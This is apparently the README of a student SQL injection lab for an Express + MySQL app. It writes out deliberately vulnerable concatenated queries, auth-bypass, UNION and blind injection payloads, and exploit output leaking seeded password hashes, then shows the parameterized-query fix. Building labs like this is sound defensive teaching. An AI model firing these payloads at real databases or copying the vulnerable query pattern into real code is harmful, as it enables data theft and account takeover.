# Project 2: SQL Injection Deep Dive

A focused, standalone lab on SQL injection: one small Express + MySQL app,
three real injection techniques run against it with Python exploit scripts,
and the fix (parameterized queries) proven to close every one of them.

This sits next to "Project 1" (a larger vulnerable-to-secure React/Node/MySQL
app) but is intentionally not a scaled-down copy of it — no frontend, no
auth sessions, no ORM. Just two endpoints, a seeded MySQL database, and
enough surface area to demonstrate classic, UNION-based, and blind SQLi
properly.

**Why this project**: my database coursework at Waterloo covered schema
design and SSH-tunneled MySQL access from the query side — writing correct
SQL and connecting to it safely. This lab flips that around: it's about how
SQL breaks when user input is trusted, and how to close that off for good.

## What's vulnerable, and why

Both endpoints build queries with raw string concatenation instead of
parameter binding — the single most common way SQL injection makes it into
production code:

```js
// app/server.js — VULNERABLE
const sql = `SELECT id, username, role FROM users WHERE username = '${username}' AND password_hash = '${passwordHash}'`;
```

```js
// app/server-fixed.js — FIXED
const sql = 'SELECT id, username, role FROM users WHERE username = ? AND password_hash = ?';
await pool.query(sql, [username, passwordHash]);
```

## Stack

- **Backend**: Node.js + Express (`app/server.js` vulnerable, `app/server-fixed.js` fixed)
- **Database**: **MySQL 5.7.24** (local `mysqld` at `/opt/anaconda3/bin/mysqld`), via the `mysql2` driver
- **Exploit scripts**: Python 3 + `requests`

MySQL was used (not the SQLite fallback) — the local `mysqld` binary starts
and connects fine once given a *short* unix socket path (MySQL enforces a
103-character limit on socket paths; a long one causes a silent-looking
`[ERROR] The socket file path is too long` abort at startup — the one snag
worth knowing about if you hit it yourself).

## Schema and seed data

`app/seed.js` creates two tables in a `sqli_lab` database and loads 10 rows
into each:

- **`users`** (`id, username, email, password_hash, role`) — 9 normal users
  plus one `admin` row (`role='admin'`) whose `password_hash` is the
  high-value target every exploit below is aimed at recovering.
- **`products`** (`id, name, category, price, description`) — a small
  product catalog that powers the `/search` endpoint.

Passwords are stored as `sha256(password)` hex digests (never plaintext) —
realistic enough to make "leak the hash" a meaningful outcome, without the
lab being about password storage.

## Setup — run from scratch

```bash
# 1. Start MySQL with a short socket path (long paths break on macOS/BSD sockets)
DATADIR=/tmp/sqli_lab_data
mkdir -p "$DATADIR"
/opt/anaconda3/bin/mysqld --initialize-insecure --datadir="$DATADIR" --basedir=/opt/anaconda3
nohup /opt/anaconda3/bin/mysqld \
  --datadir="$DATADIR" \
  --socket=/tmp/sqllab_mysql.sock \
  --port=3307 \
  --pid-file="$DATADIR/mysqld.pid" > /tmp/mysqld.log 2>&1 &

# 2. Create the database
/opt/anaconda3/bin/mysql --socket=/tmp/sqllab_mysql.sock -uroot -e "CREATE DATABASE IF NOT EXISTS sqli_lab;"

# 3. Install app deps and seed data
cd app
npm install
node seed.js         # creates tables, inserts 10 users + 10 products

# 4. Start the vulnerable server
npm start             # listens on http://localhost:3000

# ... run exploits (see below) ...

# 5. Stop it, start the fixed server, re-run the same exploits
npm run start:fixed    # same port, parameterized queries
```

```bash
# 6. Exploit scripts (separate terminal, from exploit_scripts/)
cd exploit_scripts
pip install -r requirements.txt
python3 01_classic_injection.py
python3 02_union_based.py
python3 03_blind_injection.py
```

If your MySQL connects on a different socket/host, override with env vars
before starting either server: `MYSQL_SOCKET`, or `MYSQL_HOST`/`MYSQL_PORT`
for TCP, plus `MYSQL_USER`/`MYSQL_PASSWORD`/`MYSQL_DATABASE`.

---

## 1. Classic injection — authentication bypass

**Endpoint**: `POST /login { username, password }`

**Technique**: The password is hashed server-side before it reaches the
query, so injecting through it does nothing. The `username` field, though,
is raw input spliced directly into the SQL string. The payload:

```
admin' -- 
```

closes the string literal right after `admin`, and `--` comments out
everything after it — including the entire `AND password_hash = '...'`
check. The database ends up running:

```sql
SELECT id, username, role FROM users WHERE username = 'admin'
```

No password required at all. This is "classic" because it needs nothing
beyond a quote and a comment marker — it's the injection pattern every
SQLi tutorial starts with, and still one of the most common findings in
real audits.

**Real output — against the vulnerable server:**

```
Target: http://localhost:3000/login

[1] Baseline: legitimate-looking but wrong credentials
    -> HTTP 401  {'success': False, 'message': 'Invalid credentials'}

[2] Injection payload: username = "admin' -- ", password = anything
    -> HTTP 200  {'success': True, 'user': {'id': 10, 'username': 'admin', 'role': 'admin'}}

[RESULT] AUTH BYPASS SUCCESSFUL
    Logged in as: admin  (role=admin, id=10)
    No valid password was ever supplied — the trailing SQL comment
    stripped the password_hash check out of the WHERE clause.
```

**Real output — against the fixed server:**

```
Target: http://localhost:3000/login

[1] Baseline: legitimate-looking but wrong credentials
    -> HTTP 401  {'success': False, 'message': 'Invalid credentials'}

[2] Injection payload: username = "admin' -- ", password = anything
    -> HTTP 401  {'success': False, 'message': 'Invalid credentials'}

[RESULT] Injection did not bypass auth (target may be patched).
```

The literal string `admin' -- ` is now just an unmatched username — the
quote and comment marker are inert data, not SQL syntax.

---

## 2. UNION-based injection — cross-table exfiltration

**Endpoint**: `GET /search?q=...`

**Technique**: `UNION SELECT` appends the results of a second, attacker-
chosen query onto the first, as long as the column counts line up (and
types are roughly compatible). The attack has two stages, exactly as a real
attacker would run them:

1. **Discover the column count.** Try `UNION SELECT NULL`, then
   `NULL,NULL`, and so on, until the database stops throwing a "different
   number of columns" error. This confirms the target has exactly 5 columns
   without ever needing to see the app's source.
2. **Swap in a real query.** Replace the `NULL`s with columns pulled from a
   completely different table — `users` — so its data rides back through
   the `products`-shaped JSON response the endpoint returns.

Payload used:

```
zzz_nomatch' UNION SELECT id, username, role, 0, password_hash FROM users -- 
```

**Real output — against the vulnerable server:**

```
Target: http://localhost:3000/search

[1] Discovering column count via UNION SELECT NULL,NULL,...
    n=1  -> HTTP 500 (column count mismatch)
    n=2  -> HTTP 500 (column count mismatch)
    n=3  -> HTTP 500 (column count mismatch)
    n=4  -> HTTP 500 (column count mismatch)
    n=5  -> HTTP 200 (matches!)
    -> products table has 5 columns

[2] Exfiltrating users table (id, username, role, password_hash) via UNION
    -> HTTP 200
    -> 10 user records leaked through the product search response:

    username   role     password_hash
    ---------- -------- ----------------------------------------------------------------
    alice      user     a109e36947ad56de1dca1cc49f0ef8ac9ad9a7b1aa0df41fb3c4cb73c1ff01ea
    bob        user     e51a4d872f92ebd9ecbc8c9cebecd7e1d034cc122bd9a7fa2fd719ad70a10506
    carol      user     4fd9c9fa29370a6f7446e9870e5c0e695d4206b4bb442b5e8a7fe9e1291e3993
    dave       user     63d9a00f2a3d60cab3194d9a037f1659eeb61d2dbd1aa9c3aa001bb1a9e400ed
    erin       user     9f0bc4f958ebf1d8b89867fa3402d0639a1cb0252ffc851356e2ea661152b34c
    frank      user     fc7e3b33802f8373b398dc67c5048a155d860db71fa4bb1893508177632937d6
    grace      user     f7dd33c8716503ed10fb45489a33d5e7d057d1476ade5ba60fcf54ad78fa4a57
    heidi      user     17ad12f3f255db6ecd42a96dd5eb4deb4b57b0728d210c9a0591bd679dae9f5c
    ivan       user     1074162b138c5bab219175c869d1388aba42d40108f73cdea363e3152189c192
    admin      admin    87af2904434a87cc9c6954a3c84f4f286f141e12c338beb06d2ca01b8f9f3322

[RESULT] UNION INJECTION SUCCESSFUL — admin password hash leaked:
    username=admin  password_hash=87af2904434a87cc9c6954a3c84f4f286f141e12c338beb06d2ca01b8f9f3322
```

Every password hash in the `users` table — including the admin's — leaked
through a product search box that was never supposed to touch that table.

**Real output — against the fixed server:**

```
Target: http://localhost:3000/search

[1] Discovering column count via UNION SELECT NULL,NULL,...
    n=1  -> HTTP 200 (matches!)
    -> products table has 1 columns

[2] Exfiltrating users table (id, username, role, password_hash) via UNION
    -> HTTP 200
    -> 0 user records leaked through the product search response:

    username   role     password_hash
    ---------- -------- ----------------------------------------------------------------

[RESULT] Users leaked, but no admin row found.
```

The "column count discovery" loop is meaningless against the fixed server —
it never errors, because the entire payload is now bound as one literal
search string. `curl`-ing the exact same exfiltration payload confirms it:
the server returns `{"count":0,"results":[]}` — the malicious string just
doesn't match any product name or category, because it's data, not SQL.

---

## 3. Blind injection — boolean-based and time-based

**Endpoint**: `GET /search?q=...`

**Technique**: no error message and no leaked columns this time — just a
single true/false bit per request, which is enough to reconstruct data one
character at a time.

- **Boolean-based**: inject `... OR <condition> -- `. Since `<condition>`
  doesn't reference the `products` table, it's a constant — if true, the
  `WHERE` clause becomes true for *every* row (all 10 products come back);
  if false, zero rows come back. `count: 10` vs `count: 0` is the oracle.
  Instead of testing each of the 16 possible hex characters one by one,
  the script binary-searches the **ASCII code** of each password_hash
  character (`ASCII(SUBSTRING(...)) > mid`), so each character costs
  ~6-7 requests instead of up to 16.
- **Time-based**: for when even the row count is hidden. Inject
  `... OR IF(<condition>, SLEEP(t), 0) -- `. A slow response means true, a
  fast one means false — no output needed at all, just a stopwatch. Because
  the injected condition runs once per row scanned (10 products), a small
  `SLEEP(0.1)` already produces a clearly measurable ~1s delay when true, so
  there's no need for a large sleep to make the signal obvious.

To keep the demo fast, the script extracts the first 16 characters of the
admin's password hash via the boolean technique (the remaining 48 follow
from repeating the exact same step), then re-confirms the first 2
characters using the time-based technique as a second, independent method.

**Real output — against the vulnerable server:**

```
Target: http://localhost:3000/search

[A] Boolean-based blind: extracting first 16 chars of admin's password_hash
    pos  char  requests
    1    '8'   7
    2    '7'   6
    3    'a'   6
    4    'f'   7
    5    '2'   7
    6    '9'   7
    7    '0'   7
    8    '4'   6
    9    '4'   6
    10   '3'   7
    11   '4'   6
    12   'a'   6
    13   '8'   7
    14   '7'   6
    15   'c'   7
    16   'c'   7

    Extracted prefix: 87af2904434a87cc
    Total requests: 105  |  Elapsed: 0.13s

[B] Time-based blind: confirming the first 2 characters using response timing
    pos=1 correct-guess -> 1.03s (SLOW=TRUE)   wrong-guess -> 0.00s (fast)
    pos=2 correct-guess -> 1.04s (SLOW=TRUE)   wrong-guess -> 0.00s (fast)

[RESULT] Blind extraction recovered: 87af2904434a87cc
    (Full 64-char hash would follow from repeating step A for positions 17-64.)
```

`87af2904434a87cc` matches the first 16 characters of the real admin
password hash (`87af2904434a87cc9c6954a3c84f4f286f141e12c338beb06d2ca01b8f9f3322`,
visible in the UNION exfiltration above) exactly — recovered without a single
byte of it ever appearing directly in a response body.

**Real output — against the fixed server:**

```
Target: http://localhost:3000/search

[A] Boolean-based blind: extracting first 16 chars of admin's password_hash
    pos  char  requests
    1    ' '   7
    2    ' '   7
    ...(16 positions, all identical)...
    16   ' '   7

    Extracted prefix:                 
    Total requests: 112  |  Elapsed: 0.13s

[B] Time-based blind: confirming the first 2 characters using response timing
    pos=1 correct-guess -> 0.00s (fast)   wrong-guess -> 0.00s (fast)
    pos=2 correct-guess -> 0.00s (fast)   wrong-guess -> 0.00s (fast)

[RESULT] Blind extraction recovered:                 
    (Full 64-char hash would follow from repeating step A for positions 17-64.)
```

Every boolean oracle call returns `count: 0` (the injected condition is
just inert text now), so the binary search bottoms out at the lowest ASCII
value in its search range every time — 16 spaces, not a real character. The
time-based oracle shows the same thing from a different angle: every
request is fast, because `SLEEP()` is never reached — there's no SQL left
to inject it into.

---

## The fix: parameterized queries

`app/server-fixed.js` replaces every concatenated query with a placeholder
(`?`) and a values array:

```js
// Vulnerable
const sql = `SELECT ... WHERE name LIKE '%${q}%' OR category LIKE '%${q}%'`;
await pool.query(sql);

// Fixed
const sql = 'SELECT ... WHERE name LIKE ? OR category LIKE ?';
await pool.query(sql, [`%${q}%`, `%${q}%`]);
```

**Why this closes the vulnerability, not just this payload**: with string
concatenation, user input becomes part of the SQL *text* — the database
parses it and can't tell the difference between "a value the app meant to
insert" and "a quote/comment/UNION keyword that changes the query's
structure." With a parameterized query, the SQL text is sent to MySQL
*first*, fully formed, with `?` placeholders — and the values are sent
*separately*, over the wire, tagged as data. MySQL binds them into the
already-parsed query plan; they are never re-parsed as SQL. A payload like
`admin' -- ` or `' UNION SELECT ...` just becomes a (non-matching) literal
value to compare a column against — there's no SQL left for it to break
out of. This is why the same three exploit scripts, unmodified, fail
identically against every endpoint once every query is parameterized.

---

## Repo layout

```
02-sql-injection-lab/
├── README.md
├── app/
│   ├── db.js              # shared MySQL connection pool
│   ├── seed.js             # creates schema + loads 10 users / 10 products
│   ├── server.js            # VULNERABLE: string-concatenated queries
│   ├── server-fixed.js       # FIXED: parameterized queries
│   └── package.json
└── exploit_scripts/
    ├── 01_classic_injection.py   # auth bypass via comment truncation
    ├── 02_union_based.py         # UNION SELECT cross-table exfiltration
    ├── 03_blind_injection.py     # boolean- and time-based blind extraction
    └── requirements.txt
```

## Resume bullet

> Demonstrated and remediated classic, UNION-based, and blind SQL injection
> against a live MySQL-backed Node.js application using automated Python
> exploit scripts; root-caused the flaw to string-concatenated queries and
> secured it with parameterized queries, verifying all three attacks failed
> post-fix.
